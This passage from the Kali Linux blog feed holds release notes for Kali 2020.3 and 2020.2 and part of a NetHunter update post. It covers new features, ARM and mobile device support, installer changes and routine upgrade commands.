<strong>Docker</strong> and <strong>AWS EC2</strong>) something we have seen a bit is after getting a desktop environment, people have noticed the tools are not &ldquo;there&rdquo;. This is because they are <strong>not included by default</strong>, to keep the image as small as possible. You either need to manually install them one by one, or grab the <a href="https://www.kali.org/docs/general-use/metapackages/">default metapackage</a> to get all the tools from out-of-the-box: <code>sudo apt install -y kali-linux-default</code></p> <p>Please note, Win-KeX does require <strong>WSL v2 on x64</strong> as it&rsquo;s not compatible with WSL v1, or arm64.</p> <p>For more information, please see our <a href="https://www.kali.org/docs/wsl/win-kex/">documentation page on Win-KeX</a></p> <h2 id="automating-hidpi">Automating HiDPI</h2> <p>HiDPI displays are getting more and more common. Unfortunately, Linux support, out of the box, hasn&rsquo;t been great <em>(older Linux users may remember a time where this was very common for a lot of hardware changes.)</em>. Which means after doing a fresh install, there is a bit of tweaking required to get it working, otherwise the font/text/display may be very small to read. We have <a href="https://www.kali.org/docs/general-use/hidpi/">had a guide</a> out explaining the process required to get it working, but the process before was a little &ldquo;fiddly&rdquo;. <strong>We wanted to do better</strong>.</p> <p>So we made <strong>kali-hidpi-mode</strong>. Now, either typing in <code>kali-hidpi-mode</code> or selecting it from the menu <em>(as shown below)</em>, should automate switching between HiDPI modes.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2020-3-release/images/release-2020.3-hidpi.gif'> <img src="https://www.kali.org/blog/kali-linux-2020-3-release/images/release-2020.3-hidpi.gif" alt="" /> </a> </p> </p> <h2 id="tool-icons">Tool Icons</h2> <p>Over the last few releases, we have been showing the progress on getting more themed icons for tools. We can now say, if you use the <strong>default tool listing</strong> (<code>kali-linux-default</code>), <strong>every tool in the menu</strong> (and then a few extra ones!), should have their <strong>own icon</strong> now.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2020-3-release/images/release-2020.3-icons.png'> <img src="https://www.kali.org/blog/kali-linux-2020-3-release/images/release-2020.3-icons.png" alt="" /> </a> </p> </p> <p>We will be working on adding missing tools to the menu (and creating icons for them) over the next few releases of Kali, as well as expanding into the <code>kali-linux-large</code> <a href="https://www.kali.org/docs/general-use/metapackages/">metapackage</a> (then <code>kali-tools-everything</code>/). We also have plans for these icons, outside of the menu - more information in an upcoming release!</p> <h2 id="kali-nethunter-bluetooth-arsenal">Kali NetHunter Bluetooth Arsenal</h2> <p>We are proud to introduce <strong>Bluetooth Arsenal</strong> by <a href="https://twitter.com/yesimxev">@yesimxev</a> from the <a href="https://www.kali.org/about-us/">Kali NetHunter team</a>. It combines a set of bluetooth tools in the Kali NetHunter app with some pre-configured workflows and exciting use cases. You can use your external adapter for <strong>reconnaissance</strong>, <strong>spoofing</strong>, <strong>listening to</strong> and <strong>injecting audio</strong> into various devices, including speakers, headsets, watches, or even cars.</p> <p>Please note that <code>RFCOMM</code> and <code>RFCOMM tty</code> will need to be <strong>enabled in kernels</strong> from now on to support some of the tools.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2020-3-release/images/release-2020.3-nh-bluetooth.png'> <img src="https://www.kali.org/blog/kali-linux-2020-3-release/images/release-2020.3-nh-bluetooth.png" alt="" /> </a> </p> </p> <h2 id="kali-nethunter-for-nokia-phones">Kali NetHunter for Nokia Phones</h2> <p>Kali NetHunter now supports the <strong>Nokia 3.1</strong> and <strong>Nokia 6.1</strong> phones, thanks to <a href="https://twitter.com/yesimxev">@yesimxev</a>. Images are available on our <a href="https://www.kali.org/get-kali/#kali-mobile">download site</a>. Please note that those images contain a &ldquo;minimal Kali rootfs&rdquo; due to technical reasons but you can easily install all the default tools via <code>sudo apt install -y kali-linux-default</code>.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2020-3-release/images/release-2020.3-nokia-nethunter.png'> <img src="https://www.kali.org/blog/kali-linux-2020-3-release/images/release-2020.3-nokia-nethunter.png" alt="" /> </a> </p> </p> <h2 id="setup-process">Setup Process</h2> <p>The full installer image always had all the packages required for an offline installation but if you installed a Kali Linux system with this image and without disabling the network, the installer would automatically run <code>dist-upgrade</code> <strong>during</strong> the install. This is done to make sure that you have the latest packages on first boot. And that step can <strong>take a very long time</strong>, especially after a few months after a release when <strong>lots of updates</strong> have accumulated. <strong>Starting with 2020.3, we disabled the network mirror in the full installer</strong> so that you always get the <strong>same installation speed</strong>, and the <strong>same packages and versions</strong> for that release <em>- just make sure to <a href="https://www.kali.org/docs/general-use/updating-kali/">update</a> after installing</em>!</p> <p>Whilst we were at it, we fixed another related issue. If you didn&rsquo;t have network access <em>(either voluntarily or otherwise)</em> during installation, you would get an empty <a href="https://www.kali.org/docs/general-use/kali-linux-sources-list-repositories/">network repository</a> (<code>/etc/apt/sources.list</code>/). This means, you would not be able to use <code>apt</code> to install additional packages. While there might be some users who will never have network, we believe that it&rsquo;s best to actually configure that file in <strong>all cases</strong>. <strong>So that&rsquo;s what we did</strong>. By default, any fresh installs going forward after 2020.3 will have <strong>network repositories pre-defined</strong>.</p> <h2 id="arm-device-updates">ARM Device Updates</h2> <p>We have (along with the work of <a href="https://twitter.com/frangalinux">Francisco Jose Rodríguez Martos</a> who did a lot of the back end changes) refreshed our <a href="https://gitlab.com/kalilinux/build-scripts/kali-arm">build-scripts for our ARM devices</a>. We <a href="https://www.kali.org/get-kali/#kali-arm">pre-generated various different ARM images</a> <em>(as of 2020.3 - 19 images)</em> to allow for quick download and deployment, but we have build scripts for more <em>(as of 2020.3 - 39 images)</em>. If your device is not one of ones that we release images for, you&rsquo;ll need to use the scripts to self generate the image.</p> <p>Notable changes in ARM&rsquo;s 2020.3 release:</p> <ul> <li><strong>All of the ARM images</strong> come with <strong><code>kali-linux-default</code> <a href="https://www.kali.org/docs/general-use/metapackages/">metapackage</a></strong> installed, bringing them in line with the rest of our releases, so <strong>more tools are available when you first boot</strong></li> <li>We have <strong>reduced the size of all our ARM images</strong> that are created, so downloads should be smaller. However, you will still need to use <strong>at least a 16GB</strong> sdcard/USB drive/eMMC</li> <li><strong>Pinebook</strong> and <strong>Pinebook Pro</strong> images can now be used on <strong>either sdcard or eMMC</strong></li> <li>The <strong>Pinebook</strong> image now has the WiFi driver built during image creation, instead of on first boot, this should <strong>speed up first boot time</strong> massively</li> <li>The <strong>Pinebook Pro</strong> has a change from the upstream firmware, which changes <code>ccode=DE</code> to <code>ccode=all</code> - this allows <strong>access to more 2.4GHz and 5GHz</strong> channels</li> <li>The <strong>64-bit RaspberryPi</strong> images now have the RaspberryPi <strong>userland utilities</strong> built during image creation, so <code>vcgencmd</code> and various other utilities that were previously only available on the 32-bit image are now usable on 64-bit as well</li> <li>The <strong>ODROID-C2</strong> image now uses the Kali kernel, instead of a vendor provided one. This means in the future, an <code>apt dist-upgrade</code> will get you kernel updates instead of waiting for a new Kali release</li> <li>The <code>/etc/fstab</code> file now <strong>includes the root partition via UUID</strong>, this should make it <strong>easier when trying to use a USB drive</strong> instead of sdcard on devices that support it</li> </ul> <p>A few things which are work in progress:</p> <ul> <li><strong>RaspberryPi</strong> images are using 4.19 kernels. We would like to move to 5.4 however, <code>nexmon</code> isn&rsquo;t working properly with it <em>(as the new kernel requires firmware version =&gt; 7.45.202)</em> for which <a href="https://github.com/seemoo-lab/nexmon/issues/423">no nexmon patch exists yet</a></li> <li>There is a new <strong>USBArmory Mk2</strong> <a href="https://gitlab.com/kalilinux/build-scripts/kali-arm">build script</a>. We don&rsquo;t have the hardware to test it however, so we are looking for community feedback who is able to test it out</li> <li><strong>Veyron</strong> image will be released at a later date to kernel issues that haven&rsquo;t yet been tracked down</li> </ul> <h2 id="desktop-environment">Desktop Environment</h2> <p>As there has been minor update to Gnome, we have been taking some advantages of the new settings:</p> <ul> <li>GNOME&rsquo;s file manager <code>nautilus</code> has a new theme</li> <li>GNOME&rsquo;s system-monitor now matches the colors and also has stacked CPU charts</li> <li>Improved the design for &ldquo;nested headerbars&rdquo; <em>(example, in the Settings Window, where the left headerbar is joined with the side-navbar)</em></li> </ul> <p><p> <a href='https://www.kali.org/blog/kali-linux-2020-3-release/images/release-2020.3-gnome.png'> <img src="https://www.kali.org/blog/kali-linux-2020-3-release/images/release-2020.3-gnome.png" alt="" /> </a> </p> </p> <h2 id="community-shoutouts">Community Shoutouts</h2> <p>A new section in the release notes, community shoutouts. These are <strong>people from the public who have helped Kali</strong> and the team for the last release. And we want to praise them for their work <em>(we like to give credit where due!)</em>:</p> <ul> <li><a href="https://twitter.com/crashbrz">Crash</a> who has been helping the community for some time now, thank you!</li> <li><a href="https://twitter.com/FrangaLinux">FrangaL</a> who has been doing some great work with Kali Linux ARM, thank you!</li> </ul> <p>Anyone can help out, anyone can get <a href="https://www.kali.org/docs/community/contribute/">involved</a>!</p> <h2 id="download-kali-linux-20203">Download Kali Linux 2020.3</h2> <p><strong>Fresh Images</strong> So what are you waiting for? Start <a href="https://www.kali.org/get-kali/">downloading</a> already!</p> <p>Seasoned Kali Linux users are already aware of this, but for the ones who are not, we do also produce <strong><a href="https://cdimage.kali.org/kali-images/kali-weekly/">weekly builds</a></strong> that you can use as well. If you can&rsquo;t wait for our next release and you want the latest packages when you download the image, you can just use the weekly image instead. This way you&rsquo;ll have fewer updates to do. <em>Just know these are automated builds that we don&rsquo;t QA like we do our standard release images</em>. But we gladly take bug reports about those images because we want any issues to be fixed before our next release.</p> <p><strong>Existing Upgrades</strong> If you already have an existing Kali Linux installation, remember you can always do a quick <a href="https://www.kali.org/docs/general-use/updating-kali/">update</a>:</p> <pre><code class="language-console">kali@kali:~$ echo &quot;deb http://http.kali.org/kali kali-rolling main contrib non-free&quot; | sudo tee /etc/apt/sources.list kali@kali:~$ kali@kali:~$ sudo apt update &amp;&amp; sudo apt -y full-upgrade kali@kali:~$ kali@kali:~$ [ -f /var/run/reboot-required ] &amp;&amp; sudo reboot -f kali@kali:~$ </code></pre> <p>You should now be on Kali Linux 2020.3. We can do a quick check by doing:</p> <pre><code class="language-console">kali@kali:~$ grep VERSION /etc/os-release VERSION=&quot;2020.3&quot; VERSION_ID=&quot;2020.3&quot; VERSION_CODENAME=&quot;kali-rolling&quot; kali@kali:~$ kali@kali:~$ uname -v #1 SMP Debian 5.7.6-1kali2 (2020-07-01) kali@kali:~$ kali@kali:~$ uname -r 5.7.0-kali1-amd64 kali@kali:~$ </code></pre> <p>NOTE: The output of <code>uname -r</code> may be different depending on the system <a href="https://pkg.kali.org/pkg/linux-latest">architecture</a>.</p> <p>As always, should you come across any bugs in Kali, please submit a report on our <a href="https://bugs.kali.org/main_page.php">bug tracker</a>. <em>We&rsquo;ll never be able to fix what we don&rsquo;t know is broken!</em> <strong>And <a href="https://twitter.com/kalilinux">Twitter</a> is not a Bug Tracker!</strong></p></description>
</item>
<item>
<title>Kali Linux 2020.2 Release (KDE & PowerShell)</title>
<link>https://www.kali.org/blog/kali-linux-2020-2-release/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-2020-2-release/</guid>
<pubDate>Tue, 12 May 2020 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-linux-2020-2-release/images/kali-2020.2-release.jpg" type="image/jpg"/>
<description><p>Despite the turmoil in the world, we are thrilled to be bringing you an awesome update with Kali Linux 2020.2! And it is available for immediate <a href="https://www.kali.org/get-kali/">download</a>.</p> <p>A quick overview of what&rsquo;s new since <a href="https://www.kali.org/blog/kali-linux-2020-1-release/">January</a>:</p> <ul> <li>KDE Plasma Makeover &amp; Login</li> <li>PowerShell by Default. <em>Kind of.</em></li> <li>Kali on ARM Improvements</li> <li>Lessons From The Installer Changes</li> <li>New Key Packages &amp; Icons</li> <li>Behind the Scenes, Infrastructure Improvements</li> </ul> <hr> <h2 id="kde-plasma-makeover--login">KDE Plasma Makeover &amp; Login</h2> <p>With <a href="https://www.kali.org/blog/kali-linux-2019-4-release/">Xfce</a> and GNOME having had a Kali Linux look and feel update, it&rsquo;s time to go back to our roots <em>(days of <a href="https://www.backtrack-linux.org/">BackTrack</a>)</em> and give some love and attention to KDE Plasma. Introducing our dark and light themes for KDE Plasma:</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2020-2-release/images/release-2020.2-kali-kde-dark.png'> <img src="https://www.kali.org/blog/kali-linux-2020-2-release/images/release-2020.2-kali-kde-dark.png" alt="" /> </a> </p> <p> <a href='https://www.kali.org/blog/kali-linux-2020-2-release/images/release-2020.2-kali-kde-light.png'> <img src="https://www.kali.org/blog/kali-linux-2020-2-release/images/release-2020.2-kali-kde-light.png" alt="" /> </a> </p> </p> <p>On the subject of theming, we have also tweaked the login screen (<a href="https://pkg.kali.org/pkg/lightdm">lightdm</a>). It looks different, both graphically and the layout <em>(the login boxes are aligned now)</em>!</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2020-2-release/images/release-2020.2-login-dark.png'> <img src="https://www.kali.org/blog/kali-linux-2020-2-release/images/release-2020.2-login-dark.png" alt="" /> </a> </p> <p> <a href='https://www.kali.org/blog/kali-linux-2020-2-release/images/release-2020.2-login-light.png'> <img src="https://www.kali.org/blog/kali-linux-2020-2-release/images/release-2020.2-login-light.png" alt="" /> </a> </p> </p> <hr> <h2 id="powershell-by-default-_kind-of_">PowerShell by Default. <em>Kind of.</em></h2> <p><a href="https://www.kali.org/blog/kali-linux-2019-4-release/">A while ago</a>, we put PowerShell into <a href="https://www.kali.org/docs/general-use/kali-linux-sources-list-repositories/">Kali Linux&rsquo;s network repository</a>. This means if you wanted powershell, you had to install the package as a one off by doing:</p> <pre><code class="language-console">kali@kali:~$ sudo apt install -y powershell </code></pre> <p>We now have put PowerShell into one of our (primary) <a href="https://www.kali.org/docs/general-use/metapackages/">metapackages</a>, <code>kali-linux-large</code>. This means, if you choose to install this metapackage during system setup, or once Kali is up and running <em>(<code>sudo apt install -y kali-linux-large</code>)</em>, if PowerShell is compatible with your architecture, you can just jump straight into it <em>(<code>pwsh</code>)</em>!</p> <p>PowerShell isn&rsquo;t in <em>the default</em> metapackage <em>(that&rsquo;s <code>kali-linux-default</code>)</em>, but it is in the one that includes the default and many extras, and can be included during system setup.</p> <hr> <h2 id="kali-on-arm-improvements">Kali on ARM Improvements</h2> <p>With <a href="https://www.kali.org/blog/kali-linux-2020-1-release/">Kali Linux 2020.1</a>, desktop images no longer used &ldquo;root/toor&rdquo; as the <a href="https://www.kali.org/docs/introduction/default-credentials/">default credentials</a> to login, but had moved to &ldquo;kali/kali&rdquo;. Our ARM images are now the same. We are no longer using the super user account to login with.</p> <p>We also warned back in <a href="https://www.kali.org/blog/kali-linux-2019-4-release/">2019.4</a> that we would be moving away from a 8GB minimum SD card, and we are finally ready to pull the trigger on this. The requirement is now 16GB or larger.</p> <p>One last note on the subject of ARM devices, we are not installing <code>locales-all</code> any more, so we highly recommend that you set your locale. This can be done by running the following command, <code>sudo dpkg-reconfigure locales</code>, then log out and back in.</p> <hr> <h2 id="lessons-from-installer-changes">Lessons From Installer Changes</h2> <p>With <a href="https://www.kali.org/blog/kali-linux-2020-1-release/">Kali Linux 2020.1</a> we announced our new style of images, &ldquo;installer&rdquo; &amp; &ldquo;live&rdquo;.</p> <p><strong>Issue</strong> It was intended that both &ldquo;installer&rdquo; &amp; &ldquo;live&rdquo; could be customized during setup, to select which metapackage and desktop environment to use. When we did that, we couldn&rsquo;t include metapackages beyond default in those images, as it would create too large of an ISO. As the packages were not in the image, if you selected anything other than the default options it would require network access to obtain the missing packages beyond default. After release, we noticed some users selecting &ldquo;everything&rdquo; and then waiting hours for installs to happen. They couldn&rsquo;t understand why the installs where taking so long.</p> <p>We also have used different software on the back end to generate these images, and a few bugs slipped through the cracks (which explains the <a href="https://bugs.kali.org/view.php?id=6053">2020.1a</a> and 2020.1b releases).</p> <p><strong>Solutions</strong></p> <ul> <li>We have removed <code>kali-linux-everything</code> as an install time option (which is <em>every</em> package in the Kali Linux repository) in the installer image, as you can imagine that would have taken a long time to download and wait for during install</li> <li>We have cached <code>kali-linux-large</code> &amp; every desktop environment into the install image (which is why its a little larger than previous to download) - allowing for a <strong>COMPLETE</strong> offline network install</li> <li>We have removed customization for &ldquo;live&rdquo; images - the installer switched back to copying the content of the live filesystem allowing again full offline install but forcing usage of our default XFCE desktop</li> </ul> <p><p> <a href='https://www.kali.org/blog/kali-linux-2020-2-release/images/release-2020.2-setup.png'> <img src="https://www.kali.org/blog/kali-linux-2020-2-release/images/release-2020.2-setup.png" alt="" /> </a> </p> </p> <p><strong>Summary</strong></p> <ul> <li>If you are wanting to run Kali from a live image (DVD or USB stick), please use &ldquo;live&rdquo;</li> <li>If you are wanting anything else, please use &ldquo;installer&rdquo;</li> <li>If you are wanting anything other than XFCE as your desktop environment, please use &ldquo;installer&rdquo;</li> <li><strong>If you are not sure, get &ldquo;installer&rdquo;</strong></li> </ul> <p>Also, please keep in mind on an actual assessment &ldquo;more&rdquo; is not always &ldquo;better&rdquo;. There are very few reasons to install <code>kali-linux-everything</code>, and many reasons not too. To those of you that were selecting this option, we highly suggest you <a href="https://kali.training/">take some time and educate yourself on Kali</a> before using it. Kali, or any other pentest distribution, is not a &ldquo;turn key auto hack&rdquo; solution. You still need to learn your platform, learn your tools, and educate yourself in general.</p> <p>Consider what you are really telling Kali to do when you are installing <code>kali-linux-everything</code>. Its similar to if you went into your phones app store and said &ldquo;install everything!&rdquo;. Thats likely not to have good results. We provide a lot of powerful tools and options in Kali, and while we may have a reputation of &ldquo;Providing machine guns to monkeys&rdquo;, but we actually expect you to know what you are doing. Kali is not going to hold your hand. It expects you to do the work of learning and Kali will be unforgiving if you don&rsquo;t.</p> <hr> <h2 id="new-key-packages--icons">New Key Packages &amp; Icons</h2> <p>Just like every Kali Linux release, we include the latest packages possible. Key ones to point out this release are:</p> <ul> <li><a href="https://pkg.kali.org/pkg/meta-gnome3">GNOME 3.36</a> - a few of you may have noticed a bug that slipped in during the first 12 hours of the update being available. We&rsquo;re sorry about this, and have measures in place for it to not happen again</li> <li><a href="https://pkg.kali.org/pkg/joplin">Joplin</a> - we are planning on replacing <a href="https://pkg.kali.org/pkg/cherrytree">CherryTree</a> with this in Kali Linux 2020.3!</li> <li><a href="https://pkg.kali.org/pkg/nextnet">Nextnet</a></li> <li><a href="https://pkg.kali.org/pkg/python3-defaults">Python 3.8</a></li> <li><a href="https://pkg.kali.org/pkg/spiderfoot">SpiderFoot</a></li> </ul> <p>For the time being, as a temporary measure due to certain tools needing it, we have re-included <code>python2-pip</code>. Python 2 has now reached &ldquo;<a href="https://www.kali.org/blog/python-2-end-of-life/">End Of Life</a>&rdquo; and is no longer getting updated. Tool makers, please, please, <strong>please</strong> port to Python 3. Users of tools, if you notice that a tool is not Python 3 yet, you can help too! It is not going to be around forever.</p> <p>Whilst talking about packages, we have also started to refresh our package logos for each tool. You&rsquo;ll notice them in the Kali Linux menu, as well as the tools page on <a href="https://gitlab.com/kalilinux/packages/">GitLab</a> <em>(more information on this coming soon!)</em></p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2020-2-release/images/release-2020.2-icons.png'> <img src="https://www.kali.org/blog/kali-linux-2020-2-release/images/release-2020.2-icons.png" alt="" /> </a> </p> </p> <p>If your tool has a logo and we have missed it, please let us know on the <a href="https://bugs.kali.org/bug_report_page.php">bug tracker</a>.</p> <hr> <h2 id="wslconf">WSLconf</h2> <p>WSLconf happened earlier this year, and <a href="https://twitter.com/steevdave">@Steev</a> gave a 35 minute talk on &ldquo;<a href="https://www.youtube.com/watch?v=f8m6tKErjAI">How We Use WSL at Kali</a>&rdquo;. Go check it out!</p> <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;"> <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="allowfullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.kali.org/blog/kali-linux-2020-2-release/https://www.youtube-nocookie.com/embed/f8m6tKErjAI?autoplay=0&controls=1&end=0&loop=0&mute=0&start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video" ></iframe> </div> <hr> <h2 id="behind-the-scenes-infrastructure-improvements">Behind the Scenes, Infrastructure Improvements</h2> <p>We have been celebrating the arrival of new servers, which over the last few weeks we have been migrating too. This includes a new ARM build server and what we use for <a href="https://autopkgtest.kali.org/">package testing</a>.</p> <p>This may not be directly noticeable, but you may reap the benefits of it! If you are wanting to help out with Kali, we have added a new section to our documentation showing how to submit a <a href="https://www.kali.org/docs/development/contributing-runtime-tests/">autopkgtest</a>. Feedback is welcome!</p> <hr> <h2 id="kali-nethunter">Kali NetHunter</h2> <p>We were so excited about some of the work that has been happening with NetHunter recently, we already did a <a href="https://www.kali.org/blog/kali-nethunter-updates/">mid-term release</a> to showcase them and get it to you as quick as possible.</p> <p>On top of all the previous NetHunter news there is even more to announce this time around!</p> <ul> <li>Nexmon support has been revived, bringing WiFi monitor support and frame injection to <code>wlan0</code> on the Nexus 6P, Nexus 5, Sony Xperia Z5 Compact, and more!</li> <li>OpenPlus 3T images have been added to the download page.</li> <li>We have crossed <a href="https://nethunter.kali.org/kernel-stats.html">160 different kernels in our repository</a>, allowing NetHunter to <a href="https://nethunter.kali.org/kernels.html">support over 64 devices</a>! Yes, over 160 kernels and over 64 devices supported. Amazing.</li> <li>Our documentation page has <a href="https://www.kali.org/docs/nethunter/">received a well deserved refresh</a>, especially the kernel development section.</li> </ul> <p>One of the most common questions to come in about NetHunter is &ldquo;What device should I run it on?&rdquo;. Keep your <a href="https://nethunter.kali.org/images.html">eye on this page</a> to see what your options are on an automatically updated basis!</p> <p>When you think about the amount of power NetHunter provides in such a compact package, it really is mind blowing. Its been amazing to watch this progress, and the entire Kali team is excited to show you what is coming in the future.</p> <hr> <h2 id="download-kali-linux-20202">Download Kali Linux 2020.2</h2> <p><strong>Fresh images</strong> So what are you waiting for? Start <a href="https://www.kali.org/get-kali/">downloading</a> already!</p> <p>Seasoned Kali users are already aware of this, but for the ones who are not, we do also produce <a href="https://cdimage.kali.org/kali-weekly/">weekly builds</a> that you can use as well. If you can&rsquo;t wait for our next release and you want the latest packages when you download the image, you can just use the weekly image instead. This way you&rsquo;ll have fewer updates to do. <em>Just know these are automated builds that we don&rsquo;t QA like we do our standard release images</em>.</p> <p><strong>Existing Upgrades</strong> If you already have an existing Kali installation, remember you can always do a quick update:</p> <pre><code class="language-console">kali@kali:~$ echo &quot;deb http://http.kali.org/kali kali-rolling main contrib non-free&quot; | sudo tee /etc/apt/sources.list kali@kali:~$ kali@kali:~$ sudo apt update &amp;&amp; sudo apt -y full-upgrade kali@kali:~$ kali@kali:~$ [ -f /var/run/reboot-required ] &amp;&amp; sudo reboot -f kali@kali:~$ </code></pre> <p>You should now be on Kali Linux 2020.2. We can do a quick check by doing:</p> <pre><code class="language-console">kali@kali:~$ grep VERSION /etc/os-release VERSION=&quot;2020.2&quot; VERSION_ID=&quot;2020.2&quot; VERSION_CODENAME=&quot;kali-rolling&quot; kali@kali:~$ kali@kali:~$ uname -v #1 SMP Debian 5.5.17-1kali1 (2020-04-21) kali@kali:~$ kali@kali:~$ uname -r 5.5.0-kali2-amd64 kali@kali:~$ </code></pre> <p>NOTE: The output of <code>uname -r</code> may be different depending on the system <a href="https://pkg.kali.org/pkg/linux-latest">architecture</a>.</p> <p>As always, should you come across any bugs in Kali, please submit a report on our <a href="https://bugs.kali.org/main_page.php">bug tracker</a>. <em>We&rsquo;ll never be able to fix what we don&rsquo;t know is broken!</em> <strong>And Twitter is not a Bug Tracker!</strong></p></description>
</item>
<item>
<title>Kali NetHunter Updates</title>
<link>https://www.kali.org/blog/kali-nethunter-updates/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-nethunter-updates/</guid>
<pubDate>Wed, 01 Apr 2020 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-nethunter-updates/images/kali-net-hunter-releases.jpg" type="image/jpg"/>
<description><h5 id="many-outstanding-discoveries-have-been-made-by-our-vibrant-nethunter-community-since-20201-so-we-have-decided-to-publish-a-mid-term-release-to-showcase-these-amazing-developments-on-selected-devicesmany-outstanding-discoveries-have-been-made-by-our-vibrant-nethunter-community-since-20201-so-we-have-decided-to-publish-a-mid-term-release-to-showcase-these-amazing-developments-on-selected-devices"><a href="https://www.kali.org/blog/kali-nethunter-updates/#many-outstanding-discoveries-have-been-made-by-our-vibrant-nethunter-community-since-20201-so-we-have-decided-to-publish-a-mid-term-release-to-showcase-these-amazing-developments-on-selected-devices"></a>Many outstanding discoveries have been made by our vibrant NetHunter community since 2020.1, so we have decided to publish a mid-term release to showcase these amazing developments on selected devices.</h5> <p>Massive thanks to our dedicated developers <a href="https://twitter.com/kimocoder">@Kimocoder</a>, <a href="https://twitter.com/PaulWebSec">@PaulWebSec</a>, <a href="https://twitter.com/simonpunk1">@simonpunk</a>, <a href="https://twitter.com/yesimxev">@yesimxev</a>, &amp; <a href="https://github.com/johanlike">#DJY</a> who did an incredible job in bringing you the following highlights:</p> <ul> <li>Monitor support for Qualcomm wifi chips in various snapdragon SOCs</li> <li>New RTL88XXXU drivers with injection support</li> <li>New USB function management GUI for HID attacks and much more</li> <li>GitLab CI to dramatically speed up the release workflows</li> <li>NetHunter Kernel-Builder to simplify building custom kernels</li> <li>Brand new NetHunter images for the following devices <ul> <li>Nexus 6P with Android 8.1</li> <li>Nexus 6P with LineageOS 17.1</li> <li>OnePlus 7 with Android 10</li> <li>Xiaomi Mi 9T with Miui 11</li> </ul> </li> </ul> <h2 id="nexus-6p-images-for-android-81-and-lineageos-171">Nexus 6P images for Android 8.1 and LineageOS 17.1</h2> <p><p> <a href='https://www.kali.org/blog/kali-nethunter-updates/images/NH-Release-2020.2-pre-05-nexus-6p.png'> <img src="https://www.kali.org/blog/kali-nethunter-updates/images/NH-Release-2020.2-pre-05-nexus-6p.png" alt="" /> </a> </p> </p> <p><strong>One of the most popular NetHunter devices has received a well deserved refresh.</strong></p> <p>We have released two new images to provide support for:</p> <ul> <li>Stock Android 8.1</li> <li>LineageOS 17.1 / PE 10</li> <li>Additional WiFi adaptors with injection support</li> </ul> <p>Both these images include updated kernels with the latest rtl88XXXu drivers from the legendary @Kimocoder, adding injection support for:</p> <ul> <li>RTL8812AU</li> <li>RTL8814AU</li> <li>RTL8821AU</li> </ul> <p><p> <a href='https://www.kali.org/blog/kali-nethunter-updates/images/NH-Release-2020.2-pre-01-Angler-10-rtl8812au.png'> <img src="https://www.kali.org/blog/kali-nethunter-updates/images/NH-Release-2020.2-pre-01-Angler-10-rtl8812au.png" alt="" /> </a> </p> </p> <p>The <strong>Android 8.1 image is considered the recommended release</strong> with a proven track record of supporting NetHunter under the most extreme conditions, including force encryption of the data partition.</p> <p>Considering the current maturity of Android 10 for this platform, we would consider this version to be most suited for those who love to experiment and don&rsquo;t mind getting things working by themselves. We had to edit the vendor fstab file on a laptop to disable force encryption because TWRP didn&rsquo;t support it at the time of writing. If that doesn&rsquo;t scare you then this image might be just right for you.</p> <p>Both images are available for download on our <a href="https://www.kali.org/get-kali/#kali-mobile">Kali NetHunter download page</a>.</p> <h2 id="oneplus-7-t--pro-image-for-android-10">OnePlus 7 (T / Pro) image for Android 10</h2> <p><p> <a href='https://www.kali.org/blog/kali-nethunter-updates/images/NH-Release-2020.2-pre-06-one-plus-7p.png'> <img src="https://www.kali.org/blog/kali-nethunter-updates/images/NH-Release-2020.2-pre-06-one-plus-7p.png" alt="" /> </a> </p> </p> <p>Our flagship device has received a new kernel for Android 10 based on the amazing work of the talented <a href="https://forum.xda-developers.com/m/tytydraco.8155542/">#tytydraco</a>.</p> <p>The image supports the following models in the series:</p> <ul> <li>OnePlus 7</li> <li>OnePlus 7 Pro</li> <li>OnePlus 7T</li> <li>OnePlus 7T Pro</li> </ul> <p>Please note that we do not currently recommend the OnePlus 7T and OnePlus 7T Pro until full TWRP recovery support is available.</p> <p>Our pick is the OnePlus 7 for its incredible price performance ratio.</p> <p>The new image offers all the usual bells and whistles you can expect from NetHunter but also has some improvements over the Android 9 version, such as:</p> <ul> <li>Full support for USB multi-port adaptors (USB,HDMI, ethernet, pass-through charging, etc.)</li> <li>Full HID support</li> <li>The latest rtl88XXXu drivers from @Kimocoder, adding injection support for: <ul> <li>RTL8812AU</li> <li>RTL8814AU</li> <li>RTL8821AU</li> </ul> </li> </ul> <p>The image is available for download on our <a href="https://www.kali.org/get-kali/#kali-mobile">Kali NetHunter download page</a>. Please note that Android 10 adds certain restrictions to the way storage access is handled. Please update the NetHunter app from the NetHunter store after flashing the image to enable the required access.</p> <h2 id="xiaomi-mi-9t-image-for-android-10">Xiaomi Mi 9T image for Android 10</h2> <p><p> <a href='https://www.kali.org/blog/kali-nethunter-updates/images/NH-Release-2020.2-pre-07-xiaomi-mi-9t.png'> <img src="https://www.kali.org/blog/kali-nethunter-updates/images/NH-Release-2020.2-pre-07-xiaomi-mi-9t.png" alt="" /> </a> </p> </p> <p>We are very excited to welcome our new favourite mid tier device. Sporting a Qualcomm SDM730 Snapdragon, 6GB RAM &amp; 64GB /128GB it is a beast of a machine for under US$300! The miui interface is gorgeous especially when paired with the lawnchair 3 launcher but might not be everybody&rsquo;s cup of tea. Luckily there are 3rd party ROMs available to suit everyone&rsquo;s taste.</p> <p>Just like its bigger brother, the OP7, this device includes all the bells and whistles:</p> <ul> <li>Full support for USB multi-port adaptors (USB,HDMI, ethernet, pass-through charging, etc.)</li> <li>Full HID support</li> <li>The latest rtl88XXXu drivers from @Kimocoder, adding injection support for: <ul> <li>RTL8812AU</li> <li>RTL8814AU</li> <li>RTL8821AU</li> </ul> </li> </ul> <p>Miui being a little bit eccentric, you might have to disable the &ldquo;Privileged Extension&rdquo; in the 